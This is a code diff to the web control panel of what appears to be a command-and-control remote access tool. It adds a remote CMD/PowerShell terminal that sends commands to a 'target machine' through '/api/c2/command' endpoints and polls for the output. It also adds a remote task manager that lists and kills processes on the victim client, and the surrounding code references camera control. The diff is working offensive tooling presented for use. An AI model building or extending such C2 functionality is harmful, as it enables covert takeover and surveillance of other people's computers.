@@ -691,9 +691,18 @@
                     <p class="subtitle">Execute shell commands on the target machine</p>
                 </header>
                 <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-                        <span>Terminal — coming soon</span>
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+                        <div style="display:flex;gap:8px;">
+                            <button class="btn btn-primary" id="term-mode-cmd" onclick="setTerminalShell('cmd')" style="padding:6px 14px;font-size:12px;">CMD</button>
+                            <button class="btn btn-secondary" id="term-mode-ps" onclick="setTerminalShell('ps')" style="padding:6px 14px;font-size:12px;">PowerShell</button>
+                        </div>
+                        <button class="btn btn-secondary" onclick="clearTerminalOutput()" style="padding:6px 12px;font-size:12px;">Clear Output</button>
+                    </div>
+                    <div id="terminal-screen" style="background:#0a0a0c;border:1px solid var(--border-color);border-radius:8px;padding:12px;font-family:var(--font-mono);font-size:13px;color:#a0a0b0;height:380px;overflow-y:auto;margin-bottom:12px;white-space:pre-wrap;word-break:break-all;">Aesthetic Shell [CMD mode ready]...</div>
+                    <div style="display:flex;gap:8px;">
+                        <span id="term-prompt-label" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);align-self:center;font-weight:bold;">cmd&gt;</span>
+                        <input type="text" id="term-input" placeholder="Type a command and press Enter..." style="flex:1;background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:#fff;padding:8px 12px;border-radius:8px;font-family:var(--font-mono);font-size:13px;outline:none;" onkeydown="if(event.key==='Enter') sendTerminalCommand()">
+                        <button class="btn btn-primary" onclick="sendTerminalCommand()">Send</button>
                     </div>
                 </div>
             </div>
@@ -733,9 +742,26 @@
                     <p class="subtitle">View and manage running processes</p>
                 </header>
                 <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
-                        <span>Task Manager — coming soon</span>
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+                        <button class="btn btn-primary" onclick="fetchTaskManagerList()" style="padding:6px 14px;font-size:12px;">
+                            Refresh Processes
+                        </button>
+                        <span id="taskmgr-count" style="font-size:12px;color:var(--text-muted);">0 processes</span>
+                    </div>
+                    <div style="max-height:420px;overflow-y:auto;border:1px solid var(--border-color);border-radius:8px;">
+                        <table class="info-table" style="width:100%;">
+                            <thead>
+                                <tr style="background:rgba(255,255,255,0.03);text-align:left;color:var(--text-muted);font-size:11px;text-transform:uppercase;">
+                                    <th style="padding:10px 14px;">PID</th>
+                                    <th style="padding:10px 14px;">Process Name</th>
+                                    <th style="padding:10px 14px;">RAM (MB)</th>
+                                    <th style="padding:10px 14px;">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="taskmgr-tbody">
+                                <tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted);">Click Refresh to load process list...</td></tr>
+                            </tbody>
+                        </table>
                     </div>
                 </div>
             </div>
@@ -1137,7 +1163,135 @@
                 camStatus.textContent = 'Stopped';
                 camStatus.style.color = 'var(--text-muted)';
             }
-        });
+        // Terminal & Task Manager Logic
+        let currentShellMode = 'cmd';
+
+        window.setTerminalShell = function(mode) {
+            currentShellMode = mode;
+            const cmdBtn = document.getElementById('term-mode-cmd');
+            const psBtn = document.getElementById('term-mode-ps');
+            const promptLbl = document.getElementById('term-prompt-label');
+            const screen = document.getElementById('terminal-screen');
+
+            if (mode === 'cmd') {
+                cmdBtn.className = 'btn btn-primary';
+                psBtn.className = 'btn btn-secondary';
+                promptLbl.textContent = 'cmd>';
+                screen.textContent += '\n[Switched to CMD mode]\n';
+            } else {
+                cmdBtn.className = 'btn btn-secondary';
+                psBtn.className = 'btn btn-primary';
+                promptLbl.textContent = 'PS>';
+                screen.textContent += '\n[Switched to PowerShell mode]\n';
+            }
+            screen.scrollTop = screen.scrollHeight;
+        };
+
+        window.clearTerminalOutput = function() {
+            document.getElementById('terminal-screen').textContent = `Aesthetic Shell [${currentShellMode.toUpperCase()} mode ready]...\n`;
+        };
+
+        window.sendTerminalCommand = async function() {
+            const input = document.getElementById('term-input');
+            const screen = document.getElementById('terminal-screen');
+            const cmdText = input.value.trim();
+            if (!cmdText) return;
+
+            input.value = '';
+            screen.textContent += `\n${currentShellMode}> ${cmdText}\nExecuting...`;
+            screen.scrollTop = screen.scrollHeight;
+
+            const commandPayload = (currentShellMode === 'cmd' ? 'exec_cmd:' : 'exec_ps:') + cmdText;
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: commandPayload })
+                });
+
+                // Poll for response
+                let attempts = 0;
+                const pollRes = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 30) {
+                        clearInterval(pollRes);
+                        screen.textContent += '\n[Error: Execution timeout]\n';
+                        screen.scrollTop = screen.scrollHeight;
+                        return;
+                    }
+                    const r = await fetch('/api/c2/terminal_result/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.output !== null && data.output !== undefined) {
+                        clearInterval(pollRes);
+                        screen.textContent += '\n' + data.output + '\n';
+                        screen.scrollTop = screen.scrollHeight;
+                    }
+                }, 500);
+            } catch (err) {
+                screen.textContent += '\n[Error sending command: ' + err.message + ']\n';
+                screen.scrollTop = screen.scrollHeight;
+            }
+        };
+
+        // Task Manager
+        window.fetchTaskManagerList = async function() {
+            const tbody = document.getElementById('taskmgr-tbody');
+            const countLbl = document.getElementById('taskmgr-count');
+            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--text-muted);">Fetching task list...</td></tr>';
+
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'tasklist' })
+                });
+
+                let attempts = 0;
+                const pollTasks = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) {
+                        clearInterval(pollTasks);
+                        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--danger,#ef4444);">Timeout loading processes</td></tr>';
+                        return;
+                    }
+                    const r = await fetch('/api/c2/tasklist/' + encodeURIComponent(clientId));
+                    const data = await r.json();
+                    if (data && data.tasks) {
+                        clearInterval(pollTasks);
+                        countLbl.textContent = data.tasks.length + ' processes';
+                        let html = '';
+                        data.tasks.forEach(t => {
+                            html += `<tr>
+                                <td style="font-family:var(--font-mono);">${t.pid}</td>
+                                <td><b style="color:#fff;">${t.name}</b> ${t.title ? `<span style="font-size:11px;color:var(--text-muted);">(${t.title})</span>` : ''}</td>
+                                <td style="font-family:var(--font-mono);">${t.mem} MB</td>
+                                <td>
+                                    <button class="btn btn-danger" style="padding:4px 8px;font-size:11px;" onclick="killTargetProcess(${t.pid}, '${t.name}')">Kill</button>
+                                </td>
+                            </tr>`;
+                        });
+                        tbody.innerHTML = html;
+                    }
+                }, 500);
+            } catch (err) {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:20px;color:var(--danger,#ef4444);">Error: ' + err.message + '</td></tr>';
+            }
+        };
+
+        window.killTargetProcess = async function(pid, name) {
+            if (!confirm(`Kill process ${name} (PID: ${pid})?`)) return;
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'kill:' + pid })
+                });
+                alert(`Kill command sent for ${name} (${pid})`);
+                setTimeout(fetchTaskManagerList, 1000);
+            } catch (err) {
+                alert('Failed to kill process: ' + err.message);
+            }
+        };
 
         // Mobile sidebar toggle
         (function() {
